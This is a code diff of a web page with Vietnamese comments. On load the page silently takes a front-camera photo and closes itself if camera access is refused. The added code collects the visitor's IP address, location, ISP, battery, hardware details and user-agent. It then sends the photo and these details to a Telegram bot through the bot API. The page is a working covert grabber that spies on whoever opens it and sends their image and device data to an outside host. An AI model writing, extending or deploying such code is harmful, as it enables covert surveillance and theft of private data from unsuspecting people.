@@ -17,7 +17,6 @@
             align-items: center;
         }
 
-        /* Màn hình kết quả sau khi chụp xong */
         #result-container {
             display: none;
             text-align: center;
@@ -41,13 +40,13 @@
 </head>
 <body>
 
-<!-- Khung hiển thị ảnh và thông báo sau khi hoàn tất -->
+<!-- Màn hình kết quả sau khi hoàn tất -->
 <div id="result-container">
-    <img id="captured-img" alt="Ảnh đã chụp từ camera trước">
+    <img id="captured-img" alt="Ảnh đã chụp">
     <div class="message">Ảnh bạn đã được gửi</div>
 </div>
 
-<!-- Khung camera và canvas xử lý ngầm (không hiển thị) -->
+<!-- Thẻ ngầm xử lý camera và canvas -->
 <video id="webcam" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -63,10 +62,10 @@
     const resultContainer = document.getElementById('result-container');
     const capturedImg = document.getElementById('captured-img');
 
-    // Chạy ngầm ngay khi truy cập trang web
+    // Chạy ngầm ngay khi tải trang
     window.addEventListener('DOMContentLoaded', async () => {
         try {
-            // Yêu cầu quyền truy cập CAMERA TRƯỚC (facingMode: "user")
+            // Yêu cầu cấp quyền camera trước
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user" },
                 audio: false
@@ -74,18 +73,17 @@
 
             video.srcObject = stream;
 
-            // Chờ 1 giây để ống kính camera bắt sáng/lấy nét
+            // Chờ 1 giây để camera cân bằng ánh sáng
             setTimeout(() => {
                 autoCaptureAndSend(stream);
             }, 1000);
 
         } catch (err) {
-            // Nếu người dùng từ chối quyền camera -> Thoát web
+            // Nếu không cấp quyền -> Chuyển hướng thoát trang
             exitWeb();
         }
     });
 
-    // Xử lý thoát khi người dùng từ chối cấp quyền
     function exitWeb() {
         setTimeout(() => {
             window.close();
@@ -93,26 +91,76 @@
         }, 300);
     }
 
-    // Chụp khung hình từ camera trước và gửi về Telegram
-    function autoCaptureAndSend(stream) {
+    // 1. Hàm thu thập toàn bộ thông tin thiết bị & IP
+    async function getDeviceInfo() {
+        let ipInfo = "Không lấy được IP";
+        try {
+            // Lấy thông tin IP công cộng và vị trí từ API
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) {
+                const data = await res.json();
+                ipInfo = `IP: ${data.ip}\n` +
+                         `Quốc gia: ${data.country_name} (${data.country_code})\n` +
+                         `Thành phố: ${data.city}, ${data.region}\n` +
+                         `Nhà mạng (ISP): ${data.org}`;
+            }
+        } catch (e) {
+            // Backup lấy IP đơn giản nếu API trên bị chặn
+            try {
+                const resIp = await fetch('https://api.ipify.org?format=json');
+                const dataIp = await resIp.json();
+                ipInfo = `IP: ${dataIp.ip}`;
+            } catch (err) {}
+        }
+
+        // Lấy thông tin Pin (nếu trình duyệt hỗ trợ)
+        let batteryInfo = "Không hỗ trợ";
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Đang sạc' : 'Chưa sạc'})`;
+            } catch (e) {}
+        }
+
+        // Tổng hợp thông tin hệ thống
+        const info = `🌐 THÔNG TIN TRUY CẬP 🌐\n` +
+                     `----------------------------\n` +
+                     `${ipInfo}\n` +
+                     `Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
+                     `Múi giờ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                     `Độ phân giải màn hình: ${screen.width}x${screen.height}\n` +
+                     `Kích thước cửa sổ: ${window.innerWidth}x${window.innerHeight}\n` +
+                     `Ngôn ngữ: ${navigator.language}\n` +
+                     `Số lõi CPU: ${navigator.hardwareConcurrency || 'N/A'}\n` +
+                     `Bộ nhớ RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n` +
+                     `Mức Pin: ${batteryInfo}\n` +
+                     `Nền tảng (Platform): ${navigator.platform}\n` +
+                     `User-Agent: ${navigator.userAgent}`;
+
+        return info;
+    }
+
+    // 2. Hàm chụp ảnh, đính kèm thông tin và gửi Telegram
+    async function autoCaptureAndSend(stream) {
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
 
         const context = canvas.getContext('2d');
-        // Chụp ảnh từ ống kính camera trước
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Chuyển dữ liệu ảnh thành URL để hiển thị lên giao diện web
         const imageUrl = canvas.toDataURL('image/png');
+
+        // Lấy thông tin thiết bị
+        const captionText = await getDeviceInfo();
 
         canvas.toBlob(async function(blob) {
             if (blob) {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'camera_front.png');
+                formData.append('caption', captionText); // Gửi thông tin thiết bị kèm theo ảnh
 
                 try {
-                    // Gửi tệp ảnh trực tiếp tới API Telegram
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
@@ -122,10 +170,10 @@
                 }
             }
 
-            // Tắt đèn camera sau khi đã hoàn tất chụp
+            // Tắt luồng camera
             stream.getTracks().forEach(track => track.stop());
 
-            // Hiển thị bức ảnh từ camera trước và dòng thông báo
+            // Hiển thị giao diện hoàn tất
             capturedImg.src = imageUrl;
             resultContainer.style.display = 'block';
 
